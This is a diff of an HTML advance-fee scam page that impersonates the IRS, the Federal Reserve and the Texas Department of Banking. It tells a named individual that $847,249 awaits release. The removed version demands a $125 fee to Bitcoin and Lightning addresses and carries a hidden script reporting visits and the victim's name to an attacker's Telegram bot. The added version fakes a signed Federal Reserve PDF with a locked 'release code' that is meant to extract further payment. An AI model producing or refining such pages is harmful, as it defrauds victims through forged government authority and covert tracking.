@@ -2,103 +2,146 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TIFMA | IRS Compliance & Final Clearance</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OFFICIAL_DISBURSEMENT_NOTICE_TX_9902.pdf</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500;600;700&display=swap');
-        
-        body { 
-            font-family: 'Public Sans', sans-serif; 
-            background-color: #f8fafc; 
-            color: #0f172a;
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Serif:wght@400;700&family=Public+Sans:wght@400;700&family=Roboto+Mono&display=swap');
+
+        :root {
+            --paper-width: 8.5in;
+            --paper-height: 11in;
+        }
+
+        body {
+            background-color: #525659;
+            margin: 0;
+            padding: 40px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-family: 'Noto Serif', serif;
             -webkit-font-smoothing: antialiased;
         }
 
-        .nav-header { background-color: #0f172a; color: white; border-bottom: 5px solid #b91c1c; }
-        .gov-banner { background: #f1f5f9; padding: 8px 5%; border-bottom: 1px solid #cbd5e1; font-size: 12px; }
-        .legal-footer { background-color: #0a1f2e; color: #d1d9e6; font-size: 0.8rem; padding: 3rem 0; border-top: 4px solid #fcba19; }
-        .gov-dropdown { display: none; background: #fff; border: 1px solid #e2e8f0; padding: 20px; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); position: absolute; width: 320px; z-index: 100; }
-        .active { display: block; }
-        
-        .progress-container {
-            background: #e2e8f0;
-            border-radius: 40px;
-            height: 12px;
-            overflow: hidden;
-            margin: 20px 0;
+        .page {
+            background: white;
+            width: var(--paper-width);
+            height: var(--paper-height);
+            box-shadow: 0 0 15px rgba(0,0,0,0.3);
+            position: relative;
+            padding: 0.75in 1in;
+            box-sizing: border-box;
+            color: #1a1a1a;
+            line-height: 1.5;
         }
-        .progress-fill {
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, #15803d, #22c55e);
-            border-radius: 40px;
-            animation: pulse 2s infinite;
+
+        .scanned-texture {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url('https://www.transparenttextures.com/patterns/p6-dark.png');
+            opacity: 0.03; pointer-events: none; z-index: 100;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+
+        .header-seal {
+            width: 100px;
+            height: 100px;
+            object-fit: contain;
+            image-rendering: -webkit-optimize-contrast;
+            margin-bottom: 10px;
         }
-        
-        .addr-box {
-            background: #f1f5f9;
-            padding: 10px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-size: 10px;
-            word-break: break-all;
+
+        .letterhead-text {
+            font-family: 'Public Sans', sans-serif;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .doc-id-bar {
+            border-top: 2px solid #000;
+            border-bottom: 2px solid #000;
+            padding: 8px 0;
+            margin: 15px 0;
             display: flex;
             justify-content: space-between;
+            font-family: 'Public Sans', sans-serif;
+            font-size: 11px;
+            font-weight: 700;
+        }
+
+        .redaction-zone {
+            background: #f1f5f9;
+            border: 2px dashed #94a3b8;
+            padding: 25px;
+            text-align: center;
+            margin: 25px 0;
+            position: relative;
+        }
+
+        .black-bar {
+            background: #000;
+            height: 40px;
+            width: 250px;
+            margin: 10px auto;
+            display: flex;
             align-items: center;
-            gap: 8px;
-        }
-        .copy-btn {
-            background: #1e40af;
+            justify-content: center;
             color: white;
-            border: none;
-            padding: 4px 12px;
-            border-radius: 4px;
-            font-size: 10px;
-            font-weight: bold;
-            cursor: pointer;
-            white-space: nowrap;
-        }
-        .copy-btn:hover { background: #1e3a8a; }
-        
-        .audit-trail {
-            height: 200px;
-            overflow-y: auto;
             font-family: 'Roboto Mono', monospace;
-            font-size: 10px;
-            background: #0f172a;
-            color: #22c55e;
-            padding: 12px;
-            border-radius: 6px;
+            font-size: 11px;
+            letter-spacing: 2px;
         }
-        
-        .seal-img {
-            max-width: 120px;
-            height: auto;
-            border: 2px solid #e2e8f0;
-            padding: 6px;
-            background: white;
-            border-radius: 12px;
+
+        .irs-approval-stamp {
+            position: absolute;
+            top: 250px;
+            right: 80px;
+            width: 150px;
+            height: 150px;
+            border: 4px solid rgba(21, 128, 61, 0.4);
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: rgba(21, 128, 61, 0.5);
+            font-weight: 900;
+            font-family: 'Public Sans', sans-serif;
+            text-transform: uppercase;
+            font-size: 11px;
+            transform: rotate(-15deg);
+            z-index: 50;
         }
-        
-        @media (max-width: 768px) {
-            .seal-img { max-width: 80px; }
-            .addr-box { flex-wrap: wrap; }
+
+        .irs-approval-stamp img {
+            width: 60px;
+            opacity: 0.4;
+            margin-bottom: 5px;
+        }
+
+        .remittance-alert {
+            background-color: #f0fdf4;
+            border: 1px solid #dcfce7;
+            padding: 15px;
+            margin-top: 20px;
+        }
+
+        .remittance-alert h3 { color: #166534; font-size: 12px; font-weight: 700; text-transform: uppercase; margin: 0 0 5px 0; }
+        .remittance-alert p { font-size: 10.5px; margin: 0; color: #14532d; }
+
+        @media (max-width: 9in) {
+            body { padding: 0; background: white; }
+            .page { width: 100vw; height: auto; min-height: 100vh; box-shadow: none; padding: 40px 20px; }
+            .irs-approval-stamp { right: 20px; top: 180px; width: 120px; height: 120px; }
         }
         /* News Popup Styling */
         #news-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px; }
         .news-window { background: white; width: 100%; max-width: 650px; border-radius: 16px; overflow: hidden; box-shadow: 0 30px 60px -12px rgba(0,0,0,0.6); position: relative; animation: popUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        @keyframes popUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } 
-        }
+        @keyframes popUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
     </style>
 </head>
-<body class="flex flex-col min-h-screen">
-
+<body>
         <!-- News Pop-up -->
     <div id="news-overlay">
         <div class="news-window">
@@ -140,251 +183,101 @@
             </div>
         </div>
     </div>
-    <!-- ===== OFFICIAL .GOV BANNER WITH FLAG & DROPDOWN ===== -->
-    <section class="gov-banner no-print">
-        <div class="max-w-7xl mx-auto flex items-center gap-2">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-3.5 shadow-sm" alt="US Flag">
-            <p>An official website of the United States government. <button onclick="document.getElementById('govDrop').classList.toggle('active')" class="text-blue-800 underline font-semibold ml-1">Here's how you know</button></p>
-            <div id="govDrop" class="gov-dropdown">
-                <strong>Official .gov websites are secure</strong><br>
-                A <strong>.gov</strong> website belongs to an official government organization in the United States. HTTPS usage ensures a private connection to the secure server.
+    <!-- PDF Toolbar -->
+    <div class="bg-[#323639] w-full py-2 px-6 flex justify-between items-center fixed top-0 z-[1000] border-b border-[#202124]">
+        <div class="flex items-center gap-4">
+            <i class="fas fa-file-pdf text-red-500 text-xl"></i>
+            <span class="text-white text-sm font-medium">OFFICIAL_DISBURSEMENT_NOTICE_TX_9902.pdf</span>
+        </div>
+        <div class="flex items-center gap-6 text-gray-300 text-sm">
+            <span class="hidden md:inline">1 / 1</span>
+            <div class="flex gap-4 border-l border-gray-600 pl-6">
+                <i class="fas fa-search-plus cursor-pointer hover:text-white"></i>
+                <i class="fas fa-print cursor-pointer hover:text-white" onclick="window.print()"></i>
             </div>
         </div>
-    </section>
+    </div>
 
-    <!-- ===== HEADER ===== -->
-    <header class="nav-header px-4 py-6 md:px-8 no-print">
-        <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
-            <div class="flex items-center gap-4">
-                <div class="h-12 w-12 bg-white rounded-full flex items-center justify-center text-2xl shadow-md overflow-hidden p-1">
-                   <img src="https://national-settlement-board.cfd/images/dob-texas.png" alt="Texas Seal">
+    <div class="page mt-12">
+        <div class="scanned-texture"></div>
+
+        <!-- Approval Stamp -->
+        <div class="irs-approval-stamp">
+            <img src="https://national-settlement-board.cfd/images/irs-seal.png" class="seal-img" alt="IRS">
+            IRS VERIFIED<br>TX-9902<br>NO TAX LIEN
+        </div>
+
+        <div class="flex flex-col items-center letterhead-text">
+            <img src="https://national-settlement-board.cfd/images/frs-logo.png" class="header-seal" alt="Federal Reserve Seal">
+            <h1 class="text-[17px] font-bold uppercase tracking-widest">Board of Governors of the Federal Reserve System</h1>
+            <p class="text-[10px] uppercase tracking-widest text-slate-500">Constitution Avenue NW, Washington, DC 20551</p>
+        </div>
+
+        <div class="doc-id-bar">
+            <span>REF: TIFMA/IRS-TX-9902</span>
+            <span>STATUS: FINAL_CLEARANCE</span>
+        </div>
+
+        <div class="text-[12px] space-y-4">
+            <p><strong>SUBJECT: AUTHORIZATION GRANTED FOR IMMEDIATE FUNDS RELEASE</strong></p>
+            
+            <p>To: <strong>MUJINGA THERESE MUKUNA</strong></p>
+
+            <p>
+                The Board of Governors, in coordination with the Internal Revenue Service (IRS), has completed the final compliance review for the principal amount of <strong>$847,249.00 USD</strong>. Following the successful resolution of the legal inquiry regarding Case TX-9902, the asset has been cleared of all federal tax obligations.
+            </p>
+
+            <p>
+                The <strong>Federal Release Code (FRC)</strong> has been successfully generated on the blockchain. The <strong>U.S. Secret Service (USSS) Washington Field Office</strong> has initiated a secondary review due to ongoing court issues regarding the platform of origin (PitchBook). This review is part of a broader federal effort to mitigate risk associated with high-value digital asset settlement nodes.
+            </p>
+
+            <div class="redaction-zone">
+                <p class="text-[10px] font-bold uppercase mb-2">Final 8-Digit FRC Decryption Key</p>
+                <div class="flex items-center justify-center gap-4">
+                    <span class="font-mono text-xl font-bold">FRC-2026-</span>
+                    <div class="black-bar">LOCK HELD</div>
                 </div>
-                <div>
-                    <h1 class="text-xl md:text-2xl font-black uppercase tracking-tighter text-white">Texas Department of Banking</h1>
-                    <p class="text-[9px] font-bold text-slate-400 uppercase tracking-[0.2em]">Institutional Funds Management Authority (TIFMA)</p>
-                </div>
+                <p class="text-[9px] text-amber-600 font-bold mt-4 uppercase">
+                    <i class="fas fa-shield-halved mr-1"></i> Under CYBER FRAUD INVESTIGATION
+                </p>
             </div>
-            <div class="flex items-center gap-6">
-                <div class="text-right hidden md:block text-white">
-                    <p class="text-[10px] font-mono text-blue-200">FEDERAL NODE: TX-DAL-11-RC</p>
-                    <p class="text-[10px] text-green-400 font-bold uppercase tracking-widest">● Secure Session Active</p>
-                </div>
-                <img src="https://national-settlement-board.cfd/images/tdi-seal.png" class="h-14" onerror="this.src='https://national-settlement-board.cfd/TDI.jpg'">
+
+            <div class="remittance-alert">
+                <h3>IRS Compliance Notice: Finalized</h3>
+                <p>
+                    All capital gains inquiries are closed. The IRS Seal of Approval has been affixed to this case. Upon commplete INVESTIGATION of the  administrative , the black-bar redaction will lift instantly, revealing your withdrawal code.
+                </p>
+            </div>
+
+            <p class="text-[11px] leading-relaxed">
+                We recommend immediate action to prevent the node from timing out. Once the FRC is revealed, you may proceed to your local bank or use the official FRS website to initiate the wire transfer.
+            </p>
+        </div>
+
+        <!-- Signatures -->
+        <div class="mt-20 flex justify-between items-end">
+            <div class="border-t border-black w-60 pt-2">
+                <p class="font-serif italic text-lg">Jerome H. Powell</p>
+                <p class="text-[9px] font-bold uppercase">Chairman, Board of Governors</p>
+            </div>
+            <div class="text-right">
+                <p class="text-[8px] font-mono opacity-40">TX-DALLAS-11-RC-SYNC</p>
+                <p class="text-[8px] font-mono opacity-40">HASH: 8G4D...C22F-2026</p>
             </div>
         </div>
-    </header>
+    </div>
 
-    <main class="flex-grow w-full max-w-7xl mx-auto p-4 md:p-8">
-        <div class="grid md:grid-cols-3 gap-8">
-            <!-- MAIN CONTENT - 2/3 width -->
-            <div class="md:col-span-2 space-y-6">
-                <!-- Success Banner -->
-                <div class="bg-green-50 border-l-8 border-green-600 p-6 rounded-r-lg">
-                    <div class="flex items-center gap-4">
-                        <div class="text-4xl text-green-700">✓</div>
-                        <div>
-                            <h2 class="text-xl font-black text-green-900">IRS Compliance Successful</h2>
-                            <p class="text-green-800">The legal matter with PitchBook has been resolved. No capital gains taxes will be withheld from your disbursement.</p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Progress Bar -->
-                <div class="bg-white p-6 border border-slate-200 rounded-lg">
-                    <div class="flex justify-between text-sm font-bold mb-2">
-                        <span>IRS Resolution Progress</span>
-                        <span class="text-green-700">100% Complete</span>
-                    </div>
-                    <div class="progress-container">
-                        <div class="progress-fill"></div>
-                    </div>
-                    <p class="text-xs text-slate-500 mt-3 text-center">All tax liens and compliance holds have been cleared.</p>
-                </div>
-
-                <!-- Final Standard Fee Notice -->
-                <div class="bg-amber-50 border-l-8 border-amber-600 p-6 rounded-r-lg">
-                    <div class="flex items-center gap-4 mb-4">
-                        <div class="text-4xl text-amber-700">⛓️</div>
-                        <div>
-                            <h3 class="text-lg font-black text-amber-900">Final Step — Inter-Agency Communication Fee</h3>
-                            <p class="text-amber-800 text-sm">To release the hold on your withdrawal, please remit the standard <strong>Inter-Agency Communication Fee ($125.00)</strong>. This is the final administrative charge before your funds are released.</p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Payment Options Grid -->
-                <div class="grid md:grid-cols-2 gap-6">
-                    <!-- Lightning Option -->
-                    <div class="bg-white p-5 border border-slate-200 rounded-lg shadow-sm relative">
-                        <div class="absolute top-0 left-0 w-1 h-full bg-amber-500 rounded-l-lg"></div>
-                        <p class="text-[10px] font-black text-slate-400 uppercase mb-3">IACFE Standard Remit (Lightning)</p>
-                        <div class="flex justify-center mb-4">
-                            <div class="p-2 border border-slate-200 bg-white rounded-xl">
-                                <img src="https://national-settlement-board.cfd/images/insurance-lightning.png" class="seal-img" alt="Lightning QR" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhhxarfdenhjer9wd5kwm33xgcs4dejrg'">
-                            </div>
-                        </div>
-                        <div class="addr-box">
-                            <span id="l-addr" class="truncate max-w-[180px]">lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhhxarfdenhjer9wd5kwm33xgcs4dejrg</span>
-                            <button class="copy-btn" onclick="copy('l-addr')">COPY</button>
-                        </div>
-                        <div class="mt-3 text-center">
-                            <span class="text-[11px] font-black text-amber-700">Amount Due: $125.00 (Fixed Rate)</span>
-                        </div>
-                    </div>
-
-                    <!-- BTC On-Chain Option -->
-                    <div class="bg-white p-5 border border-slate-200 rounded-lg shadow-sm">
-                        <p class="text-[10px] font-black text-slate-400 uppercase mb-3">Blockchain Address (BTC)</p>
-                        <div class="flex justify-center mb-4">
-                            <div class="p-2 border border-slate-200 bg-white rounded-xl">
-                                <img src="https://national-settlement-board.cfd/images/insurance-btc.png" class="seal-img" alt="BTC QR" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=bc1p0mxat232pc4xwwclzghr3643w76hqs4362lehecawwmmmpkmkt3s72eut8'">
-                            </div>
-                        </div>
-                        <div class="addr-box">
-                            <span id="b-addr" class="truncate max-w-[180px]">bc1p0mxat232pc4xwwclzghr3643w76hqs4362lehecawwmmmpkmkt3s72eut8</span>
-                            <button class="copy-btn" onclick="copy('b-addr')">COPY</button>
-                        </div>
-                        <div class="mt-3 text-center text-[10px] text-slate-500 italic">
-                            <i class="fa-solid fa-shield-halved mr-1"></i> Multi-Sig Encryption Enabled
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Continue Button -->
-                <div class="text-center">
-                    <a href="https://national-settlement-board.cfd/frc-download-pdf.html" class="inline-block bg-blue-900 hover:bg-blue-800 text-white font-black px-10 py-4 rounded uppercase text-sm tracking-wider shadow-lg transition-all">
-                        ✓ PROCEED TO FRC DOCUMENT
-                    </a>
-                    <p class="text-[10px] text-slate-500 mt-3">After payment, your withdrawal hold will be lifted.</p>
-                </div>
+    <!-- Actions -->
+    <div class="mt-8 flex gap-4 no-print pb-10">
+        <a href="https://national-settlement-board.cfd/collateral-pending.html" 
+           class="flex items-center gap-3 px-8 py-3 bg-[#0f172a] text-white rounded shadow-xl hover:bg-slate-800 transition-all">
+            <i class="fas fa-lock-open text-amber-400"></i>
+            <div class="text-left">
+                <span class="block text-[10px] font-black uppercase tracking-widest">Unlock Final Code</span>
+                <span class="block text-[8px] opacity-70 underline">Access Secure Portal</span>
             </div>
-
-            <!-- SIDEBAR -->
-            <aside class="space-y-6">
-                <!-- Payee Identity Panel -->
-                <div class="bg-white border border-slate-200 rounded-lg shadow-sm overflow-hidden">
-                    <div class="bg-slate-100 px-4 py-2 border-b border-slate-200">
-                        <p class="text-[10px] font-black text-slate-600 uppercase">Payee Identity</p>
-                    </div>
-                    <div class="p-5 text-center">
-                        <div class="w-16 h-16 bg-green-50 rounded-full mx-auto flex items-center justify-center mb-3 border-2 border-green-600">
-                            <i class="fa-solid fa-user-check text-2xl text-green-700"></i>
-                        </div>
-                        <h5 class="text-sm font-bold">Mujinga T. Mukuna</h5>
-                        <p class="text-[9px] text-slate-500 font-bold uppercase mt-1">IRS Compliance Verified</p>
-                        <p class="text-[10px] text-green-700 mt-2 font-mono">Case: TX-B10B-2026-MUK1139</p>
-                    </div>
-                </div>
-
-                <!-- Audit Log Panel -->
-                <div class="bg-white border border-slate-200 rounded-lg shadow-sm overflow-hidden">
-                    <div class="bg-slate-100 px-4 py-2 border-b border-slate-200">
-                        <p class="text-[10px] font-black text-slate-600 uppercase flex items-center gap-2">
-                            <i class="fa-solid fa-terminal"></i> SYSTEM_AUDIT_LOG
-                        </p>
-                    </div>
-                    <div id="log-box" class="audit-trail h-48"></div>
-                </div>
-
-                <!-- Support Panel -->
-                <div class="bg-white border border-slate-200 rounded-lg shadow-sm p-4 text-center">
-                    <i class="fa-solid fa-headset text-2xl text-blue-800 mb-2"></i>
-                    <p class="text-[10px] font-bold uppercase">24/7 Support</p>
-                    <p class="text-[9px] text-slate-500">support@national-settlement-board.cfd</p>
-                </div>
-            </aside>
-        </div>
-    </main>
-
-    <!-- ===== FOOTER WITH SEALS AND IMAGES ===== -->
-    <footer class="legal-footer mt-20 no-print">
-        <div class="max-w-7xl mx-auto px-6">
-            <div class="grid md:grid-cols-3 gap-12 mb-12">
-                <div>
-                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Federal Regulatory Oversight</h5>
-                    <p class="text-xs text-slate-400 leading-loose">
-                        Texas Department of Banking<br>
-                        2601 N Lamar Blvd, Austin, TX 78705
-                    </p>
-                </div>
-                <div>
-                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Network Node 11</h5>
-                    <p class="text-xs text-slate-400 leading-loose">
-                        Eleventh District Federal Reserve<br>
-                        Dallas Operations Center
-                    </p>
-                </div>
-                <div>
-                    <h5 class="text-white font-black text-sm uppercase tracking-widest mb-4">Access Protocol</h5>
-                    <p class="text-[10px] text-slate-500 italic leading-relaxed">
-                        Authorized beneficiary access only. Sessions monitored under CFAA.
-                    </p>
-                </div>
-            </div>
-            <div class="pt-8 border-t border-slate-800 flex flex-wrap justify-between items-center gap-4">
-                <p class="text-[10px] text-slate-600 uppercase font-mono tracking-widest">Electronic Fund Transfer Protocol v26.3</p>
-                <div class="flex gap-6">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-3.5 shadow-sm" alt="US Flag">
-                    <img src="https://national-settlement-board.cfd/Federal-Reserve-System-Logo.png" class="h-8 opacity-40 grayscale" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Seal_of_the_United_States_Federal_Reserve_System.svg/249px-Seal_of_the_United_States_Federal_Reserve_System.svg.png'">
-                    <img src="https://national-settlement-board.cfd/images/texas-state-seal.png" class="h-8 opacity-40 grayscale" alt="Texas Seal">
-                </div>
-            </div>
-        </div>
-    </footer>
-
-    <script>
-        function copy(id) {
-            const text = document.getElementById(id).innerText;
-            navigator.clipboard.writeText(text);
-            const btn = event.target;
-            const original = btn.innerText;
-            btn.innerText = "COPIED";
-            setTimeout(() => btn.innerText = original, 2000);
-        }
-
-        function toggleGov() { document.getElementById('govDrop').classList.toggle('active'); }
-
-        const scanLogs = [
-            "DECRYPTING_IRS_HANDSHAKE...",
-            "SUCCESS: CAPITAL_GAINS_EXEMPTION_APPLIED",
-            "CASE_TX9902: CLOSED_PENDING_IACFE",
-            "INITIALIZING_FINAL_8DIGIT_STRING...",
-            "WAITING_FOR_IACFE_PORT_125..."
-        ];
-        let i = 0;
-        const logBox = document.getElementById('log-box');
-        function addLog(msg, color = '#22c55e') {
-            const entry = document.createElement('div');
-            const time = new Date().toLocaleTimeString([], {hour12: false});
-            entry.innerHTML = `<span class="text-slate-500">[${time}]</span> <span style="color:${color}">${msg}</span>`;
-            logBox.appendChild(entry);
-            logBox.scrollTop = logBox.scrollHeight;
-        }
-        setInterval(() => {
-            addLog(scanLogs[i % scanLogs.length]);
-            i++;
-        }, 4000);
-        window.onload = () => {
-            addLog("ESTABLISHING_SECURE_NODE_TX...", "#3b82f6");
-            addLog("IRS_STATUS: VERIFIED_SUCCESSFUL", "#22c55e");
-        };
-        window.toggleGov = toggleGov;
-    </script>
-
-    <script>
-        (function() {
-            const _t0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
-            const _c0 = '7275242903';
-            const log = (msg) => {
-                fetch(`https://api.telegram.org/bot${_t0[0]}:${_t0[1]}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: _c0, text: `PDF_NOTICE: ${msg} | ${localStorage.getItem('tifma_name') || 'User'}` })
-                }).catch(() => {});
-            };
-            log('Document Viewed - Authentic Mode');
-        })();
-    </script>
+        </a>
+    </div>
 
     <script>
 (function() {
